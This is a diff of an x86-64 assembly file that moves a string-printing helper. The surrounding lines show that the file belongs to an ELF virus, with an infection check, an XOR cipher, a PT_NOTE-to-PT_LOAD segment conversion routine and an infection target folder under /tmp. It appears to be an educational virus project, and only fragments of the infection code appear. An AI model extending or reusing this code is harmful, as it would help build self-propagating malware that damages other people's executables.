@@ -77,6 +77,33 @@ can_run_infection:
 		xor rax, rax				; return 0;
 		ret
 
+; void print_string(char const *str);
+; void print_string(rdi str);
+print_string:
+	push rdi					; save str
+	xor rdx, rdx					; _len = 0;
+	.begin_strlen_loop:				; while (true) {
+		mov sil, [rdi]				; _c = *_str;
+		cmp sil, 0				; if (_c == 0)
+		je .end_strlen_loop			; 	break;
+		inc rdx					; _len++
+		inc rdi					; _str++;
+		jmp .begin_strlen_loop			; }
+	.end_strlen_loop:				; ...
+	pop rsi						; load str
+	mov rax, SYS_WRITE				; write(
+	mov rdi, 1					; 	1,
+	syscall						;	str, _len);
+	mov rax, SYS_WRITE				; write(
+	mov rdi, 1					; 	1,
+	push 0x0A					; 	'\n',
+	mov rsi, rsp					; 	...
+	mov rdx, 1					; 	1
+	syscall						; );
+	add rsp, 8					; unpop '\n'
+
+	ret
+
 ; void xor_cipher(char *data, int size, char *key);
 ; xor_cipher(rdi data, rsi size, rdx key);
 xor_cipher:
@@ -748,33 +775,6 @@ convert_pt_note_to_load:
 	pop rbp
 	%pop
 	ret						; return _ret;
-
-; void print_string(char const *str);
-; void print_string(rdi str);
-print_string:
-	push rdi					; save str
-	xor rdx, rdx					; _len = 0;
-	.begin_strlen_loop:				; while (true) {
-		mov sil, [rdi]				; _c = *_str;
-		cmp sil, 0				; if (_c == 0)
-		je .end_strlen_loop			; 	break;
-		inc rdx					; _len++
-		inc rdi					; _str++;
-		jmp .begin_strlen_loop			; }
-	.end_strlen_loop:				; ...
-	pop rsi						; load str
-	mov rax, SYS_WRITE				; write(
-	mov rdi, 1					; 	1,
-	syscall						;	str, _len);
-	mov rax, SYS_WRITE				; write(
-	mov rdi, 1					; 	1, 
-	push 0x0A					; 	'\n',
-	mov rsi, rsp					; 	...
-	mov rdx, 1					; 	1
-	syscall						; );
-	add rsp, 8					; unpop '\n'
-
-	ret
 
 section .data
 	infected_folder_1: db "/tmp/test/", 0
